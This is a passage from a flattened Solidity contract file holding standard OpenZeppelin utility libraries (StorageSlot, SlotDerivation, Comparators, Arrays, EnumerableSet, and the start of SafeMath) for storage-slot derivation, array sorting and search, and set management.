 * TIP: Consider using this library along with {SlotDerivation}.
 */
library StorageSlot {
    struct AddressSlot {
        address value;
    }

    struct BooleanSlot {
        bool value;
    }

    struct Bytes32Slot {
        bytes32 value;
    }

    struct Uint256Slot {
        uint256 value;
    }

    struct Int256Slot {
        int256 value;
    }

    struct StringSlot {
        string value;
    }

    struct BytesSlot {
        bytes value;
    }

    /**
     * @dev Returns an `AddressSlot` with member `value` located at `slot`.
     */
    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `BooleanSlot` with member `value` located at `slot`.
     */
    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `Bytes32Slot` with member `value` located at `slot`.
     */
    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `Uint256Slot` with member `value` located at `slot`.
     */
    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `Int256Slot` with member `value` located at `slot`.
     */
    function getInt256Slot(bytes32 slot) internal pure returns (Int256Slot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns a `StringSlot` with member `value` located at `slot`.
     */
    function getStringSlot(bytes32 slot) internal pure returns (StringSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `StringSlot` representation of the string storage pointer `store`.
     */
    function getStringSlot(string storage store) internal pure returns (StringSlot storage r) {
        assembly ("memory-safe") {
            r.slot := store.slot
        }
    }

    /**
     * @dev Returns a `BytesSlot` with member `value` located at `slot`.
     */
    function getBytesSlot(bytes32 slot) internal pure returns (BytesSlot storage r) {
        assembly ("memory-safe") {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `BytesSlot` representation of the bytes storage pointer `store`.
     */
    function getBytesSlot(bytes storage store) internal pure returns (BytesSlot storage r) {
        assembly ("memory-safe") {
            r.slot := store.slot
        }
    }
}

// File: @openzeppelin/contracts/utils/SlotDerivation.sol


// OpenZeppelin Contracts (last updated v5.3.0) (utils/SlotDerivation.sol)
// This file was procedurally generated from scripts/generate/templates/SlotDerivation.js.

pragma solidity ^0.8.20;

/**
 * @dev Library for computing storage (and transient storage) locations from namespaces and deriving slots
 * corresponding to standard patterns. The derivation method for array and mapping matches the storage layout used by
 * the solidity language / compiler.
 *
 * See https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html#mappings-and-dynamic-arrays[Solidity docs for mappings and dynamic arrays.].
 *
 * Example usage:
 * ```solidity
 * contract Example {
 *     // Add the library methods
 *     using StorageSlot for bytes32;
 *     using SlotDerivation for bytes32;
 *
 *     // Declare a namespace
 *     string private constant _NAMESPACE = "<namespace>"; // eg. OpenZeppelin.Slot
 *
 *     function setValueInNamespace(uint256 key, address newValue) internal {
 *         _NAMESPACE.erc7201Slot().deriveMapping(key).getAddressSlot().value = newValue;
 *     }
 *
 *     function getValueInNamespace(uint256 key) internal view returns (address) {
 *         return _NAMESPACE.erc7201Slot().deriveMapping(key).getAddressSlot().value;
 *     }
 * }
 * ```
 *
 * TIP: Consider using this library along with {StorageSlot}.
 *
 * NOTE: This library provides a way to manipulate storage locations in a non-standard way. Tooling for checking
 * upgrade safety will ignore the slots accessed through this library.
 *
 * _Available since v5.1._
 */
library SlotDerivation {
    /**
     * @dev Derive an ERC-7201 slot from a string (namespace).
     */
    function erc7201Slot(string memory namespace) internal pure returns (bytes32 slot) {
        assembly ("memory-safe") {
            mstore(0x00, sub(keccak256(add(namespace, 0x20), mload(namespace)), 1))
            slot := and(keccak256(0x00, 0x20), not(0xff))
        }
    }

    /**
     * @dev Add an offset to a slot to get the n-th element of a structure or an array.
     */
    function offset(bytes32 slot, uint256 pos) internal pure returns (bytes32 result) {
        unchecked {
            return bytes32(uint256(slot) + pos);
        }
    }

    /**
     * @dev Derive the location of the first element in an array from the slot where the length is stored.
     */
    function deriveArray(bytes32 slot) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            mstore(0x00, slot)
            result := keccak256(0x00, 0x20)
        }
    }

    /**
     * @dev Derive the location of a mapping element from the key.
     */
    function deriveMapping(bytes32 slot, address key) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            mstore(0x00, and(key, shr(96, not(0))))
            mstore(0x20, slot)
            result := keccak256(0x00, 0x40)
        }
    }

    /**
     * @dev Derive the location of a mapping element from the key.
     */
    function deriveMapping(bytes32 slot, bool key) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            mstore(0x00, iszero(iszero(key)))
            mstore(0x20, slot)
            result := keccak256(0x00, 0x40)
        }
    }

    /**
     * @dev Derive the location of a mapping element from the key.
     */
    function deriveMapping(bytes32 slot, bytes32 key) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            mstore(0x00, key)
            mstore(0x20, slot)
            result := keccak256(0x00, 0x40)
        }
    }

    /**
     * @dev Derive the location of a mapping element from the key.
     */
    function deriveMapping(bytes32 slot, uint256 key) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            mstore(0x00, key)
            mstore(0x20, slot)
            result := keccak256(0x00, 0x40)
        }
    }

    /**
     * @dev Derive the location of a mapping element from the key.
     */
    function deriveMapping(bytes32 slot, int256 key) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            mstore(0x00, key)
            mstore(0x20, slot)
            result := keccak256(0x00, 0x40)
        }
    }

    /**
     * @dev Derive the location of a mapping element from the key.
     */
    function deriveMapping(bytes32 slot, string memory key) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            let length := mload(key)
            let begin := add(key, 0x20)
            let end := add(begin, length)
            let cache := mload(end)
            mstore(end, slot)
            result := keccak256(begin, add(length, 0x20))
            mstore(end, cache)
        }
    }

    /**
     * @dev Derive the location of a mapping element from the key.
     */
    function deriveMapping(bytes32 slot, bytes memory key) internal pure returns (bytes32 result) {
        assembly ("memory-safe") {
            let length := mload(key)
            let begin := add(key, 0x20)
            let end := add(begin, length)
            let cache := mload(end)
            mstore(end, slot)
            result := keccak256(begin, add(length, 0x20))
            mstore(end, cache)
        }
    }
}

// File: @openzeppelin/contracts/utils/Comparators.sol


// OpenZeppelin Contracts (last updated v5.1.0) (utils/Comparators.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides a set of functions to compare values.
 *
 * _Available since v5.1._
 */
library Comparators {
    function lt(uint256 a, uint256 b) internal pure returns (bool) {
        return a < b;
    }

    function gt(uint256 a, uint256 b) internal pure returns (bool) {
        return a > b;
    }
}

// File: @openzeppelin/contracts/utils/Arrays.sol


// OpenZeppelin Contracts (last updated v5.3.0) (utils/Arrays.sol)
// This file was procedurally generated from scripts/generate/templates/Arrays.js.

pragma solidity ^0.8.20;





/**
 * @dev Collection of functions related to array types.
 */
library Arrays {
    using SlotDerivation for bytes32;
    using StorageSlot for bytes32;

    /**
     * @dev Sort an array of uint256 (in memory) following the provided comparator function.
     *
     * This function does the sorting "in place", meaning that it overrides the input. The object is returned for
     * convenience, but that returned value can be discarded safely if the caller has a memory pointer to the array.
     *
     * NOTE: this function's cost is `O(n · log(n))` in average and `O(n²)` in the worst case, with n the length of the
     * array. Using it in view functions that are executed through `eth_call` is safe, but one should be very careful
     * when executing this as part of a transaction. If the array being sorted is too large, the sort operation may
     * consume more gas than is available in a block, leading to potential DoS.
     *
     * IMPORTANT: Consider memory side-effects when using custom comparator functions that access memory in an unsafe way.
     */
    function sort(
        uint256[] memory array,
        function(uint256, uint256) pure returns (bool) comp
    ) internal pure returns (uint256[] memory) {
        _quickSort(_begin(array), _end(array), comp);
        return array;
    }

    /**
     * @dev Variant of {sort} that sorts an array of uint256 in increasing order.
     */
    function sort(uint256[] memory array) internal pure returns (uint256[] memory) {
        sort(array, Comparators.lt);
        return array;
    }

    /**
     * @dev Sort an array of address (in memory) following the provided comparator function.
     *
     * This function does the sorting "in place", meaning that it overrides the input. The object is returned for
     * convenience, but that returned value can be discarded safely if the caller has a memory pointer to the array.
     *
     * NOTE: this function's cost is `O(n · log(n))` in average and `O(n²)` in the worst case, with n the length of the
     * array. Using it in view functions that are executed through `eth_call` is safe, but one should be very careful
     * when executing this as part of a transaction. If the array being sorted is too large, the sort operation may
     * consume more gas than is available in a block, leading to potential DoS.
     *
     * IMPORTANT: Consider memory side-effects when using custom comparator functions that access memory in an unsafe way.
     */
    function sort(
        address[] memory array,
        function(address, address) pure returns (bool) comp
    ) internal pure returns (address[] memory) {
        sort(_castToUint256Array(array), _castToUint256Comp(comp));
        return array;
    }

    /**
     * @dev Variant of {sort} that sorts an array of address in increasing order.
     */
    function sort(address[] memory array) internal pure returns (address[] memory) {
        sort(_castToUint256Array(array), Comparators.lt);
        return array;
    }

    /**
     * @dev Sort an array of bytes32 (in memory) following the provided comparator function.
     *
     * This function does the sorting "in place", meaning that it overrides the input. The object is returned for
     * convenience, but that returned value can be discarded safely if the caller has a memory pointer to the array.
     *
     * NOTE: this function's cost is `O(n · log(n))` in average and `O(n²)` in the worst case, with n the length of the
     * array. Using it in view functions that are executed through `eth_call` is safe, but one should be very careful
     * when executing this as part of a transaction. If the array being sorted is too large, the sort operation may
     * consume more gas than is available in a block, leading to potential DoS.
     *
     * IMPORTANT: Consider memory side-effects when using custom comparator functions that access memory in an unsafe way.
     */
    function sort(
        bytes32[] memory array,
        function(bytes32, bytes32) pure returns (bool) comp
    ) internal pure returns (bytes32[] memory) {
        sort(_castToUint256Array(array), _castToUint256Comp(comp));
        return array;
    }

    /**
     * @dev Variant of {sort} that sorts an array of bytes32 in increasing order.
     */
    function sort(bytes32[] memory array) internal pure returns (bytes32[] memory) {
        sort(_castToUint256Array(array), Comparators.lt);
        return array;
    }

    /**
     * @dev Performs a quick sort of a segment of memory. The segment sorted starts at `begin` (inclusive), and stops
     * at end (exclusive). Sorting follows the `comp` comparator.
     *
     * Invariant: `begin <= end`. This is the case when initially called by {sort} and is preserved in subcalls.
     *
     * IMPORTANT: Memory locations between `begin` and `end` are not validated/zeroed. This function should
     * be used only if the limits are within a memory array.
     */
    function _quickSort(uint256 begin, uint256 end, function(uint256, uint256) pure returns (bool) comp) private pure {
        unchecked {
            if (end - begin < 0x40) return;

            // Use first element as pivot
            uint256 pivot = _mload(begin);
            // Position where the pivot should be at the end of the loop
            uint256 pos = begin;

            for (uint256 it = begin + 0x20; it < end; it += 0x20) {
                if (comp(_mload(it), pivot)) {
                    // If the value stored at the iterator's position comes before the pivot, we increment the
                    // position of the pivot and move the value there.
                    pos += 0x20;
                    _swap(pos, it);
                }
            }

            _swap(begin, pos); // Swap pivot into place
            _quickSort(begin, pos, comp); // Sort the left side of the pivot
            _quickSort(pos + 0x20, end, comp); // Sort the right side of the pivot
        }
    }

    /**
     * @dev Pointer to the memory location of the first element of `array`.
     */
    function _begin(uint256[] memory array) private pure returns (uint256 ptr) {
        assembly ("memory-safe") {
            ptr := add(array, 0x20)
        }
    }

    /**
     * @dev Pointer to the memory location of the first memory word (32bytes) after `array`. This is the memory word
     * that comes just after the last element of the array.
     */
    function _end(uint256[] memory array) private pure returns (uint256 ptr) {
        unchecked {
            return _begin(array) + array.length * 0x20;
        }
    }

    /**
     * @dev Load memory word (as a uint256) at location `ptr`.
     */
    function _mload(uint256 ptr) private pure returns (uint256 value) {
        assembly {
            value := mload(ptr)
        }
    }

    /**
     * @dev Swaps the elements memory location `ptr1` and `ptr2`.
     */
    function _swap(uint256 ptr1, uint256 ptr2) private pure {
        assembly {
            let value1 := mload(ptr1)
            let value2 := mload(ptr2)
            mstore(ptr1, value2)
            mstore(ptr2, value1)
        }
    }

    /// @dev Helper: low level cast address memory array to uint256 memory array
    function _castToUint256Array(address[] memory input) private pure returns (uint256[] memory output) {
        assembly {
            output := input
        }
    }

    /// @dev Helper: low level cast bytes32 memory array to uint256 memory array
    function _castToUint256Array(bytes32[] memory input) private pure returns (uint256[] memory output) {
        assembly {
            output := input
        }
    }

    /// @dev Helper: low level cast address comp function to uint256 comp function
    function _castToUint256Comp(
        function(address, address) pure returns (bool) input
    ) private pure returns (function(uint256, uint256) pure returns (bool) output) {
        assembly {
            output := input
        }
    }

    /// @dev Helper: low level cast bytes32 comp function to uint256 comp function
    function _castToUint256Comp(
        function(bytes32, bytes32) pure returns (bool) input
    ) private pure returns (function(uint256, uint256) pure returns (bool) output) {
        assembly {
            output := input
        }
    }

    /**
     * @dev Searches a sorted `array` and returns the first index that contains
     * a value greater or equal to `element`. If no such index exists (i.e. all
     * values in the array are strictly less than `element`), the array length is
     * returned. Time complexity O(log n).
     *
     * NOTE: The `array` is expected to be sorted in ascending order, and to
     * contain no repeated elements.
     *
     * IMPORTANT: Deprecated. This implementation behaves as {lowerBound} but lacks
     * support for repeated elements in the array. The {lowerBound} function should
     * be used instead.
     */
    function findUpperBound(uint256[] storage array, uint256 element) internal view returns (uint256) {
        uint256 low = 0;
        uint256 high = array.length;

        if (high == 0) {
            return 0;
        }

        while (low < high) {
            uint256 mid = Math.average(low, high);

            // Note that mid will always be strictly less than high (i.e. it will be a valid array index)
            // because Math.average rounds towards zero (it does integer division with truncation).
            if (unsafeAccess(array, mid).value > element) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        // At this point `low` is the exclusive upper bound. We will return the inclusive upper bound.
        if (low > 0 && unsafeAccess(array, low - 1).value == element) {
            return low - 1;
        } else {
            return low;
        }
    }

    /**
     * @dev Searches an `array` sorted in ascending order and returns the first
     * index that contains a value greater or equal than `element`. If no such index
     * exists (i.e. all values in the array are strictly less than `element`), the array
     * length is returned. Time complexity O(log n).
     *
     * See C++'s https://en.cppreference.com/w/cpp/algorithm/lower_bound[lower_bound].
     */
    function lowerBound(uint256[] storage array, uint256 element) internal view returns (uint256) {
        uint256 low = 0;
        uint256 high = array.length;

        if (high == 0) {
            return 0;
        }

        while (low < high) {
            uint256 mid = Math.average(low, high);

            // Note that mid will always be strictly less than high (i.e. it will be a valid array index)
            // because Math.average rounds towards zero (it does integer division with truncation).
            if (unsafeAccess(array, mid).value < element) {
                // this cannot overflow because mid < high
                unchecked {
                    low = mid + 1;
                }
            } else {
                high = mid;
            }
        }

        return low;
    }

    /**
     * @dev Searches an `array` sorted in ascending order and returns the first
     * index that contains a value strictly greater than `element`. If no such index
     * exists (i.e. all values in the array are strictly less than `element`), the array
     * length is returned. Time complexity O(log n).
     *
     * See C++'s https://en.cppreference.com/w/cpp/algorithm/upper_bound[upper_bound].
     */
    function upperBound(uint256[] storage array, uint256 element) internal view returns (uint256) {
        uint256 low = 0;
        uint256 high = array.length;

        if (high == 0) {
            return 0;
        }

        while (low < high) {
            uint256 mid = Math.average(low, high);

            // Note that mid will always be strictly less than high (i.e. it will be a valid array index)
            // because Math.average rounds towards zero (it does integer division with truncation).
            if (unsafeAccess(array, mid).value > element) {
                high = mid;
            } else {
                // this cannot overflow because mid < high
                unchecked {
                    low = mid + 1;
                }
            }
        }

        return low;
    }

    /**
     * @dev Same as {lowerBound}, but with an array in memory.
     */
    function lowerBoundMemory(uint256[] memory array, uint256 element) internal pure returns (uint256) {
        uint256 low = 0;
        uint256 high = array.length;

        if (high == 0) {
            return 0;
        }

        while (low < high) {
            uint256 mid = Math.average(low, high);

            // Note that mid will always be strictly less than high (i.e. it will be a valid array index)
            // because Math.average rounds towards zero (it does integer division with truncation).
            if (unsafeMemoryAccess(array, mid) < element) {
                // this cannot overflow because mid < high
                unchecked {
                    low = mid + 1;
                }
            } else {
                high = mid;
            }
        }

        return low;
    }

    /**
     * @dev Same as {upperBound}, but with an array in memory.
     */
    function upperBoundMemory(uint256[] memory array, uint256 element) internal pure returns (uint256) {
        uint256 low = 0;
        uint256 high = array.length;

        if (high == 0) {
            return 0;
        }

        while (low < high) {
            uint256 mid = Math.average(low, high);

            // Note that mid will always be strictly less than high (i.e. it will be a valid array index)
            // because Math.average rounds towards zero (it does integer division with truncation).
            if (unsafeMemoryAccess(array, mid) > element) {
                high = mid;
            } else {
                // this cannot overflow because mid < high
                unchecked {
                    low = mid + 1;
                }
            }
        }

        return low;
    }

    /**
     * @dev Access an array in an "unsafe" way. Skips solidity "index-out-of-range" check.
     *
     * WARNING: Only use if you are certain `pos` is lower than the array length.
     */
    function unsafeAccess(address[] storage arr, uint256 pos) internal pure returns (StorageSlot.AddressSlot storage) {
        bytes32 slot;
        assembly ("memory-safe") {
            slot := arr.slot
        }
        return slot.deriveArray().offset(pos).getAddressSlot();
    }

    /**
     * @dev Access an array in an "unsafe" way. Skips solidity "index-out-of-range" check.
     *
     * WARNING: Only use if you are certain `pos` is lower than the array length.
     */
    function unsafeAccess(bytes32[] storage arr, uint256 pos) internal pure returns (StorageSlot.Bytes32Slot storage) {
        bytes32 slot;
        assembly ("memory-safe") {
            slot := arr.slot
        }
        return slot.deriveArray().offset(pos).getBytes32Slot();
    }

    /**
     * @dev Access an array in an "unsafe" way. Skips solidity "index-out-of-range" check.
     *
     * WARNING: Only use if you are certain `pos` is lower than the array length.
     */
    function unsafeAccess(uint256[] storage arr, uint256 pos) internal pure returns (StorageSlot.Uint256Slot storage) {
        bytes32 slot;
        assembly ("memory-safe") {
            slot := arr.slot
        }
        return slot.deriveArray().offset(pos).getUint256Slot();
    }

    /**
     * @dev Access an array in an "unsafe" way. Skips solidity "index-out-of-range" check.
     *
     * WARNING: Only use if you are certain `pos` is lower than the array length.
     */
    function unsafeMemoryAccess(address[] memory arr, uint256 pos) internal pure returns (address res) {
        assembly {
            res := mload(add(add(arr, 0x20), mul(pos, 0x20)))
        }
    }

    /**
     * @dev Access an array in an "unsafe" way. Skips solidity "index-out-of-range" check.
     *
     * WARNING: Only use if you are certain `pos` is lower than the array length.
     */
    function unsafeMemoryAccess(bytes32[] memory arr, uint256 pos) internal pure returns (bytes32 res) {
        assembly {
            res := mload(add(add(arr, 0x20), mul(pos, 0x20)))
        }
    }

    /**
     * @dev Access an array in an "unsafe" way. Skips solidity "index-out-of-range" check.
     *
     * WARNING: Only use if you are certain `pos` is lower than the array length.
     */
    function unsafeMemoryAccess(uint256[] memory arr, uint256 pos) internal pure returns (uint256 res) {
        assembly {
            res := mload(add(add(arr, 0x20), mul(pos, 0x20)))
        }
    }

    /**
     * @dev Helper to set the length of a dynamic array. Directly writing to `.length` is forbidden.
     *
     * WARNING: this does not clear elements if length is reduced, of initialize elements if length is increased.
     */
    function unsafeSetLength(address[] storage array, uint256 len) internal {
        assembly ("memory-safe") {
            sstore(array.slot, len)
        }
    }

    /**
     * @dev Helper to set the length of a dynamic array. Directly writing to `.length` is forbidden.
     *
     * WARNING: this does not clear elements if length is reduced, of initialize elements if length is increased.
     */
    function unsafeSetLength(bytes32[] storage array, uint256 len) internal {
        assembly ("memory-safe") {
            sstore(array.slot, len)
        }
    }

    /**
     * @dev Helper to set the length of a dynamic array. Directly writing to `.length` is forbidden.
     *
     * WARNING: this does not clear elements if length is reduced, of initialize elements if length is increased.
     */
    function unsafeSetLength(uint256[] storage array, uint256 len) internal {
        assembly ("memory-safe") {
            sstore(array.slot, len)
        }
    }
}

// File: @openzeppelin/contracts/utils/structs/EnumerableSet.sol


// OpenZeppelin Contracts (last updated v5.3.0) (utils/structs/EnumerableSet.sol)
// This file was procedurally generated from scripts/generate/templates/EnumerableSet.js.

pragma solidity ^0.8.20;


/**
 * @dev Library for managing
 * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
 * types.
 *
 * Sets have the following properties:
 *
 * - Elements are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Elements are enumerated in O(n). No guarantees are made on the ordering.
 * - Set can be cleared (all elements removed) in O(n).
 *
 * ```solidity
 * contract Example {
 *     // Add the library methods
 *     using EnumerableSet for EnumerableSet.AddressSet;
 *
 *     // Declare a set state variable
 *     EnumerableSet.AddressSet private mySet;
 * }
 * ```
 *
 * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
 * and `uint256` (`UintSet`) are supported.
 *
 * [WARNING]
 * ====
 * Trying to delete such a structure from storage will likely result in data corruption, rendering the structure
 * unusable.
 * See https://github.com/ethereum/solidity/pull/11843[ethereum/solidity#11843] for more info.
 *
 * In order to clean an EnumerableSet, you can either remove all elements one by one or create a fresh instance using an
 * array of EnumerableSet.
 * ====
 */
library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;
        // Position is the index of the value in the `values` array plus 1.
        // Position 0 is used to mean a value is not in the set.
        mapping(bytes32 value => uint256) _positions;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._positions[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We cache the value's position to prevent multiple reads from the same storage slot
        uint256 position = set._positions[value];

        if (position != 0) {
            // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 valueIndex = position - 1;
            uint256 lastIndex = set._values.length - 1;

            if (valueIndex != lastIndex) {
                bytes32 lastValue = set._values[lastIndex];

                // Move the lastValue to the index where the value to delete is
                set._values[valueIndex] = lastValue;
                // Update the tracked position of the lastValue (that was just moved)
                set._positions[lastValue] = position;
            }

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the tracked position for the deleted slot
            delete set._positions[value];

            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes all the values from a set. O(n).
     *
     * WARNING: Developers should keep in mind that this function has an unbounded cost and using it may render the
     * function uncallable if the set grows to the point where clearing it consumes too much gas to fit in a block.
     */
    function _clear(Set storage set) private {
        uint256 len = _length(set);
        for (uint256 i = 0; i < len; ++i) {
            delete set._positions[set._values[i]];
        }
        Arrays.unsafeSetLength(set._values, 0);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._positions[value] != 0;
    }

    /**
     * @dev Returns the number of values on the set. O(1).
     */
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        return set._values[index];
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function _values(Set storage set) private view returns (bytes32[] memory) {
        return set._values;
    }

    // Bytes32Set

    struct Bytes32Set {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    /**
     * @dev Removes all the values from a set. O(n).
     *
     * WARNING: Developers should keep in mind that this function has an unbounded cost and using it may render the
     * function uncallable if the set grows to the point where clearing it consumes too much gas to fit in a block.
     */
    function clear(Bytes32Set storage set) internal {
        _clear(set._inner);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {
        bytes32[] memory store = _values(set._inner);
        bytes32[] memory result;

        assembly ("memory-safe") {
            result := store
        }

        return result;
    }

    // AddressSet

    struct AddressSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Removes all the values from a set. O(n).
     *
     * WARNING: Developers should keep in mind that this function has an unbounded cost and using it may render the
     * function uncallable if the set grows to the point where clearing it consumes too much gas to fit in a block.
     */
    function clear(AddressSet storage set) internal {
        _clear(set._inner);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(AddressSet storage set) internal view returns (address[] memory) {
        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        assembly ("memory-safe") {
            result := store
        }

        return result;
    }

    // UintSet

    struct UintSet {
        Set _inner;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     */
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     */
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    /**
     * @dev Removes all the values from a set. O(n).
     *
     * WARNING: Developers should keep in mind that this function has an unbounded cost and using it may render the
     * function uncallable if the set grows to the point where clearing it consumes too much gas to fit in a block.
     */
    function clear(UintSet storage set) internal {
        _clear(set._inner);
    }

    /**
     * @dev Returns true if the value is in the set. O(1).
     */
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    /**
     * @dev Returns the number of values in the set. O(1).
     */
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    /**
     * @dev Returns the value stored at position `index` in the set. O(1).
     *
     * Note that there are no guarantees on the ordering of values inside the
     * array, and it may change when more values are added or removed.
     *
     * Requirements:
     *
     * - `index` must be strictly less than {length}.
     */
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }

    /**
     * @dev Return the entire set in an array
     *
     * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
     * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
     * this function has an unbounded cost, and using it as part of a state-changing function may render the function
     * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
     */
    function values(UintSet storage set) internal view returns (uint256[] memory) {
        bytes32[] memory store = _values(set._inner);
        uint256[] memory result;

        assembly ("memory-safe") {
            result := store
        }

        return result;
    }
}

// File: @openzeppelin/contracts/utils/math/SafeMath.sol


// OpenZeppelin Contracts (last updated v4.9.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
